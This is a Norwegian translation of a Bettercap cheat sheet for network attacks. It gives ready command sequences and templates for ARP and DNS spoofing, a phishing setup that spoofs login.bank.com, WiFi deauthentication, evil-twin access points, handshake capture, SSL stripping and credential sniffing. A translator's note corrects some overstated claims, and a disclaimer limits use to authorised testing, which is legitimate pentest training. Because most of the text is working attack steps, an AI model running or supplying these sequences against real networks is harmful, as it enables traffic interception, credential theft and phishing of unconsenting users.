# 🦈 Bettercap – hurtigguide til et rammeverk for nettverksangrep

<!-- language-home-navigation -->
[🏠 Norsk startside](../../README.nb.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](README.tr.md) • [🇬🇷 Ελληνικά](README.el.md)

```
  ██████╗ ███████╗████████╗████████╗███████╗██████╗  ██████╗ █████╗ ██████╗ 
  ██╔══██╗██╔════╝╚══██╔══╝╚══██╔══╝██╔════╝██╔══██╗██╔════╝██╔══██╗██╔══██╗
  ██████╔╝█████╗     ██║      ██║   █████╗  ██████╔╝██║     ███████║██████╔╝
  ██╔══██╗██╔══╝     ██║      ██║   ██╔══╝  ██╔══██╗██║     ██╔══██║██╔═══╝ 
  ██████╔╝███████╗   ██║      ██║   ███████╗██║  ██║╚██████╗██║  ██║██║     
  ╚═════╝ ╚══════╝   ╚═╝      ╚═╝   ╚══════╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚═╝     
            Allsidig verktøy for nettverksangrep
```

<p align="center">
  <img src="https://img.shields.io/badge/Bettercap-MITM-blue?style=for-the-badge" alt="Bettercap">
  <img src="https://img.shields.io/badge/WiFi-Attacks-red?style=for-the-badge" alt="WiFi">
  <img src="https://img.shields.io/badge/Network-Recon-green?style=for-the-badge" alt="Network">
</p>

> **Merknad til originalen:** WiFi-delen krever støtte for monitormodus og pakkeinjisering. Flere kommandoer og parametere i originalen er versjonsavhengige: den undersøkte dokumentasjonen beskriver `wifi.ap` som injisering av beacon-rammer, ikke et fullverdig tilgangspunkt som gir klienter nettverkstilgang, og `wifi.handshakes.file` som en filsti ([WiFi-modulen](https://www.bettercap.org/modules/wifi/)). SSL-stripping er ingen generell omgåelse av HSTS eller moderne HTTPS ([HSTS i nettleseren](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Strict-Transport-Security)); HTTPS-mellomtjeneren signerer sertifikater med sin egen CA, som klienten må stole på for at TLS skal fungere uten sertifikatfeil ([HTTPS-mellomtjeneren](https://www.bettercap.org/modules/ethernet/proxies/httpsproxy/)). Nettgrensesnittets adresse, port og autentisering bestemmes av aktuell caplet/API-konfigurasjon, og innstillingene for `http.server` er ikke nødvendigvis innstillingene for API-et ([offisiell UI-dokumentasjon](https://www.bettercap.org/usage/web_ui/)). Originaleksemplene er bevart uendret.

---

## 📋 Innhold

- [Hva er Bettercap](#-hva-er-bettercap)
- [Installasjon](#-installasjon)
- [Grunnleggende bruk](#-grunnleggende-bruk)
- [Nettverkskartlegging](#-nettverkskartlegging)
- [ARP-forfalskning (MITM)](#-arp-forfalskning-mitm)
- [DNS-forfalskning](#-dns-forfalskning)
- [WiFi-angrep](#-wifi-angrep)
- [Nedgradering av HTTPS](#-nedgradering-av-https)
- [Avlytting av påloggingsopplysninger](#-avlytting-av-påloggingsopplysninger)
- [Caplet-skript](#-caplet-skript)
- [Nettgrensesnitt](#-nettgrensesnitt)
- [Hurtigreferanse](#-hurtigreferanse)

---

## 🎯 Hva er Bettercap

**Bettercap** er et allsidig verktøy for kartlegging av WiFi, Bluetooth og nettverk. Originalen beskriver det som en etterfølger til ettercap med moderne funksjoner:

- 🔍 **Nettverkskartlegging** – oppdag verter og tjenester
- 🎭 **MITM-angrep** – ARP- og DNS-forfalskning (spoofing), der trafikk eller svar utgis for å komme fra en annen part
- 📶 **WiFi-angrep** – deautentisering, falske tilgangspunkter (evil twin) og fangst av håndtrykk
- 🔓 **Innsamling av påloggingsopplysninger** – HTTP og HTTPS (nedgradering)
- 📡 **Bluetooth/BLE** – oppdagelse av enheter og angrep
- 🌐 **Nettgrensesnitt** – visuelt brukergrensesnitt i nettleseren

### Funksjoner

| Funksjon | Beskrivelse |
| --------- | ------------- |
| **Modulært** | Kan utvides med caplet-skript |
| **Interaktivt** | Kommandoskall i sanntid |
| **Kan skriptes** | Automatiser med caplet-filer |
| **Nettgrensesnitt** | Nettleserbasert grensesnitt |
| **Go som programmeringsspråk** | Raskt, moderne og tilgjengelig på flere plattformer |

---

## 🚀 Installasjon

### Kali Linux (forhåndsinstallert)

```bash
# Allerede installert i Kali
bettercap --help

# Oppdater
sudo apt update && sudo apt install bettercap
```

### Debian/Ubuntu

```bash
sudo apt update
sudo apt install bettercap
```

### Fra kildekoden

```bash
# Installer Go først
sudo apt install golang

# Installer bettercap
go install github.com/bettercap/bettercap@latest

# Eller
git clone https://github.com/bettercap/bettercap
cd bettercap
make build
sudo make install
```

### Installer brukergrensesnittet (valgfritt)

```bash
# Last ned nettgrensesnittet
sudo bettercap -eval "caplets.update; ui.update; quit"
```

---

## 💻 Grunnleggende bruk

### Start Bettercap

```bash
# Grunnleggende oppstart (krever root)
sudo bettercap

# Angi grensesnitt
sudo bettercap -iface eth0
sudo bettercap -iface wlan0

# Ikke-interaktiv kjøring (kjør kommandoer)
sudo bettercap -eval "net.probe on; net.show"

# Last inn en caplet-fil
sudo bettercap -caplet http-ui
```

### Interaktivt kommandoskall

```bash
# Inne i bettercap-skallet
» help                      # Vis alle kommandoer
» help net.probe            # Hjelp for en bestemt modul
» net.show                  # Vis oppdagede verter
» set arp.spoof.targets X   # Angi variabel
» arp.spoof on              # Aktiver modul
» quit                      # Avslutt
```

### Moduladministrasjon

```bash
# Vis alle moduler
» help

# Hent informasjon om modulen
» help arp.spoof

# Aktiver modul
» arp.spoof on

# Deaktiver modul
» arp.spoof off

# Vis modulinnstillinger
» get arp.spoof.*
```

---

## 🔍 Nettverkskartlegging

### Oppdagelse av verter

```bash
# Aktiver aktiv nettverkskartlegging
» net.probe on

# Vis oppdagede verter
» net.show

# Utdata:
┌─────────────────────────────────────────────────────────────┐
│ IP               MAC                Vendor            Seen  │
├─────────────────────────────────────────────────────────────┤
│ 192.168.1.1      AA:BB:CC:DD:EE:FF  TP-Link           5s    │
│ 192.168.1.100    11:22:33:44:55:66  Apple             2s    │
└─────────────────────────────────────────────────────────────┘
```

### Nettverksinformasjon

```bash
# Vis gjeldende grensesnitt
» net.show

# Grensesnittinformasjon
» get net.interface.*

# Gateway-informasjon
» get gateway.*
```

### Valg for aktiv kartlegging

```bash
# Angi hastighetsbegrensning for kartlegging
» set net.probe.throttle 10

# Passiv modus (bare lytting)
» set net.probe.passive true

# Angi tidsavbrudd for kartlegging
» set net.probe.timeout 500
```

### Kartleggingskommandoer

```bash
# Full kartlegging
» net.recon on

# Tøm vertslisten
» net.clear

# Vis bare aktive verter
» set net.show.meta true
» net.show

# Eksporter til fil
» set net.sniff.output /tmp/capture.pcap
» net.sniff on
```

---

## 🎭 ARP-forfalskning (MITM)

### Grunnleggende ARP-forfalskning

```bash
# Start bettercap
sudo bettercap -iface eth0

# Aktiver aktiv kartlegging
» net.probe on

# Vent, og vis deretter vertene
» net.show

# Angi mål (offer)
» set arp.spoof.targets 192.168.1.100

# Aktiver ARP-forfalskning
» arp.spoof on

# Du er nå mellompart (MITM)!
```

### Full dupleks (begge retninger)

```bash
# Forfalsk ARP overfor både offeret og gatewayen
» set arp.spoof.fullduplex true
» set arp.spoof.targets 192.168.1.100
» arp.spoof on
```

### Forfalsk ARP for hele delnettet

```bash
# Velg alle verter (unntatt gatewayen)
» set arp.spoof.targets 192.168.1.0/24
» arp.spoof on

# Bare internt (ikke forfalsk ARP overfor gatewayen)
» set arp.spoof.internal true
» arp.spoof on
```

### ARP-forfalskning og avlytting

```bash
# Fullstendig oppsett for mellommannsangrep (MITM)
» net.probe on
» set arp.spoof.targets 192.168.1.100
» set arp.spoof.fullduplex true
» arp.spoof on
» net.sniff on
```

---

## 🌐 DNS-forfalskning

### Grunnleggende DNS-forfalskning

```bash
# Angi mål for DNS-forfalskning
» set dns.spoof.domains example.com, *.example.com

# Angi omdirigeringsadressen (din maskin)
» set dns.spoof.address 192.168.1.50

# Aktiver (krever ARP-forfalskning)
» arp.spoof on
» dns.spoof on
```

### Forfalsk alle domener

```bash
# Jokertegn – omdiriger alt
» set dns.spoof.domains *
» set dns.spoof.address 192.168.1.50
» dns.spoof on
```

### Flere domener

```bash
# Liste over domener
» set dns.spoof.domains facebook.com, *.facebook.com, twitter.com, *.twitter.com
» set dns.spoof.address 192.168.1.50
» dns.spoof on
```

### DNS-forfalskning med HTTP-server

```bash
# Fullstendig oppsett for nettfisking (phishing)
» set dns.spoof.domains login.example.com
» set dns.spoof.address 192.168.1.50
» dns.spoof on

# Start HTTP-serveren på maskinen din
» set http.server.path /var/www/phishing
» http.server on
```

---

## 📶 WiFi-angrep

### Aktiver WiFi-modus

```bash
# Start med et WiFi-grensesnitt
sudo bettercap -iface wlan0

# Aktiver WiFi-kartlegging
» wifi.recon on

# Vis oppdagede tilgangspunkter
» wifi.show
```

### WiFi-kartlegging

```bash
# Vis alle tilgangspunkter
» wifi.show

# Utdata:
┌───────────────────────────────────────────────────────────────────┐
│ RSSI  BSSID              Ch  Enc     ESSID               Clients │
├───────────────────────────────────────────────────────────────────┤
│ -45   AA:BB:CC:DD:EE:FF   6  WPA2    HomeNetwork              3  │
│ -60   11:22:33:44:55:66   1  WPA2    Office_WiFi              1  │
└───────────────────────────────────────────────────────────────────┘
```

### Deautentiseringsangrep

```bash
# Deautentiser alle klientene fra et bestemt tilgangspunkt
» wifi.deauth AA:BB:CC:DD:EE:FF

# Deautentiser en bestemt klient
» set wifi.deauth.station 11:22:33:44:55:66
» wifi.deauth AA:BB:CC:DD:EE:FF

# Kontinuerlig deautentisering
» set wifi.deauth.repeat 100
» wifi.deauth AA:BB:CC:DD:EE:FF
```

### Fangst av håndtrykk

```bash
# Aktiver WiFi-kartlegging
» wifi.recon on

# Angi kanal (samme som målet)
» wifi.recon.channel 6

# Fang opp håndtrykk
» set wifi.handshakes.file /tmp/handshakes/

# Deautentiser for å tvinge frem ny tilkobling
» wifi.deauth AA:BB:CC:DD:EE:FF

# Kontroller innsamlede håndtrykk
» wifi.show.wpa
```

### Angrep med falskt tilgangspunkt (evil twin)

```bash
# Klon tilgangspunktet
» set wifi.ap.ssid "Free WiFi"
» set wifi.ap.bssid AA:BB:CC:DD:EE:FF
» set wifi.ap.channel 6
» set wifi.ap.encryption false

# Start et falskt tilgangspunkt
» wifi.ap on

# Deautentiser nå det ekte tilgangspunktet for å tvinge klientene til å koble til
» wifi.deauth <real_AP_BSSID>
```

### PMKID-angrep

```bash
# Moderne angrep uten tilkoblet klient
» wifi.recon on
» wifi.assoc AA:BB:CC:DD:EE:FF

# PMKID fanges opp i mappen for håndtrykk
» wifi.show.wpa
```

---

## 🔒 Nedgradering av HTTPS

### SSL-stripping (omgåelse av HSTS)

```bash
# Aktiver ARP-forfalskning først
» arp.spoof on

# Aktiver SSL-stripping
» set https.proxy.sslstrip true
» https.proxy on

# Eller bruk HTTP-mellomtjeneren
» http.proxy on
```

### HTTPS-mellomtjener

```bash
# Sett opp HTTPS-mellomtjeneren
» set https.proxy.address 0.0.0.0
» set https.proxy.port 8080
» https.proxy on

# Med sertifikat
» set https.proxy.certificate /path/to/cert.pem
» set https.proxy.key /path/to/key.pem
» https.proxy on
```

### Fang opp HTTPS-trafikk

```bash
# Fullstendig MITM med HTTPS
» net.probe on
» set arp.spoof.targets 192.168.1.100
» arp.spoof on
» set https.proxy.sslstrip true
» https.proxy on
» net.sniff on
```

---

## 🔓 Avlytting av påloggingsopplysninger

### HTTP-påloggingsopplysninger

```bash
# Aktiver avlytting
» net.sniff on

# Aktiver lokal pakkeavlytting
» set net.sniff.local true
» net.sniff on

# Filtrer HTTP
» set net.sniff.filter "tcp port 80"
» net.sniff on
```

### Innsamling av påloggingsopplysninger

```bash
# Fullstendig innsamling av påloggingsopplysninger
» net.probe on
» set arp.spoof.targets 192.168.1.100
» arp.spoof on
» set https.proxy.sslstrip true
» https.proxy on
» net.sniff on

# Påloggingsopplysningene vises i sanntid
```

### Lagre til fil

```bash
# Lagre innsamlede pakker
» set net.sniff.output /tmp/capture.pcap
» net.sniff on

# Detaljert utdata
» set net.sniff.verbose true
» net.sniff on
```

---

## 📜 Caplet-skript

### Hva er caplet-skript?

Caplets er skriptfiler (.cap) som automatiserer bettercap-kommandoer.

### Innebygde caplet-skript

```bash
# Vis caplet-skript
» caplets.show

# Vanlige caplet-skript:
- http-ui       # Nettgrensesnitt
- https-ui      # Sikret nettgrensesnitt
- local-sniffer # Avlytt lokal trafikk
- mitm          # Grunnleggende MITM-oppsett
- pita          # Automatisering av WiFi-angrep
```

### Last inn et caplet-skript

```bash
# Fra kommandolinjen
sudo bettercap -caplet http-ui

# Inne i bettercap
» caplet http-ui

# Fra fil
sudo bettercap -caplet /path/to/custom.cap
```

### Opprett et eget caplet-skript

```bash
# Fil: my-mitm.cap
net.probe on
sleep 5
set arp.spoof.targets 192.168.1.100
set arp.spoof.fullduplex true
arp.spoof on
net.sniff on
set net.sniff.verbose true
```

```bash
# Kjør et eget caplet-skript
sudo bettercap -caplet my-mitm.cap
```

### Oppdater caplet-skript

```bash
# Oppdater alle caplet-skript
» caplets.update
```

---

## 🌐 Nettgrensesnitt

### Start nettgrensesnittet

```bash
# Installer brukergrensesnittet først
sudo bettercap -eval "caplets.update; ui.update; quit"

# Start med nettgrensesnittet (HTTP)
sudo bettercap -caplet http-ui

# Start med HTTPS-grensesnittet
sudo bettercap -caplet https-ui

# Åpne: https://127.0.0.1:8080/
# Standard påloggingsopplysninger: user/pass
```

### Funksjoner i nettgrensesnittet

| Funksjon | Beskrivelse |
| --------- | ------------- |
| **Dashboard** | Nettverksoversikt i sanntid |
| **Hosts** | Oppdagede enheter |
| **WiFi** | Trådløse nettverk |
| **BLE** | Bluetooth-enheter |
| **Events** | Aktivitetslogg |
| **Packets** | Innsamlet trafikk |

### Konfigurer nettgrensesnittet

```bash
# Angi påloggingsopplysninger
» set http.server.username admin
» set http.server.password secretpass

# Angi port
» set http.server.port 8080

# Adresse som tjenesten skal lytte på
» set http.server.address 0.0.0.0
```

---

## 📊 Hurtigreferanse

### Viktige kommandoer

| Kommando | Beskrivelse |
| --------- | ------------- |
| `net.probe on` | Start oppdagelse av verter |
| `net.show` | Vis oppdagede verter |
| `arp.spoof on` | Aktiver ARP-forfalskning |
| `net.sniff on` | Start pakkefangst |
| `dns.spoof on` | Aktiver DNS-forfalskning |
| `wifi.recon on` | Start WiFi-skanning |
| `wifi.deauth BSSID` | Deautentiseringsangrep |
| `https.proxy on` | Aktiver HTTPS-mellomtjeneren |

### Vanlige variabler

| Variabel | Beskrivelse |
| ---------- | ------------- |
| `arp.spoof.targets` | Mål for mellommannsangrep |
| `arp.spoof.fullduplex` | Forfalsk i begge retninger |
| `dns.spoof.domains` | Domener som skal forfalskes |
| `dns.spoof.address` | IP-adresse for omdirigering |
| `net.sniff.output` | PCAP-utdatafil |
| `wifi.ap.ssid` | Navnet på det falske tilgangspunktet |

### Mal for MITM-angrep

```bash
# Grunnleggende MITM
sudo bettercap -iface eth0 -eval "
net.probe on;
sleep 3;
set arp.spoof.targets 192.168.1.100;
set arp.spoof.fullduplex true;
arp.spoof on;
net.sniff on"
```

### Mal for WiFi-angrep

```bash
# WiFi-deautentisering og pakkefangst
sudo bettercap -iface wlan0 -eval "
wifi.recon on;
sleep 5;
wifi.deauth AA:BB:CC:DD:EE:FF"
```

### Fullstendig nettfiskingsangrep

```bash
# DNS-forfalskning og falskt nettsted
» net.probe on
» set arp.spoof.targets 192.168.1.100
» arp.spoof on
» set dns.spoof.domains login.bank.com
» set dns.spoof.address 192.168.1.50
» dns.spoof on
» set http.server.path /var/www/fake-login
» http.server on
```

---

## ⚠️ Juridisk ansvarsfraskrivelse

```
⚠️ ADVARSEL: Bettercap er et kraftig verktøy som kan avskjære
nettverkstrafikk. Bruk det bare på nettverk du EIER eller har
UTTRYKKELIG SKRIFTLIG TILLATELSE til å teste.

✅ Autorisert penetrasjonstesting
✅ Sikkerhetsforskning (i et laboratoriemiljø)
✅ Opplæring

❌ Uautorisert avlytting er ULOVLIG
❌ Bruk aldri verktøyet på offentlige nettverk
❌ Stjel aldri påloggingsopplysninger
```

---

## 📚 Ressurser

- [Offisielt nettsted for Bettercap](https://www.bettercap.org/)
- [Bettercap på GitHub](https://github.com/bettercap/bettercap)
- [Bettercap-dokumentasjon](https://www.bettercap.org/modules/)
- [Caplet-skript](https://github.com/bettercap/caplets)

### Relaterte hurtigguider
- [Aircrack-ng](../../Aircrack-ng/translations/README.nb.md)
- [Wifite](../../Wifite/translations/README.nb.md)
- [Wireshark](../../Wireshark/translations/README.nb.md)

---

<p align="center">
  <b>🦈 Lær nettverksangrep grundig!</b><br>
  <i>Bettercap – et allsidig verktøy for penetrasjonstesting av nettverk</i>
</p>
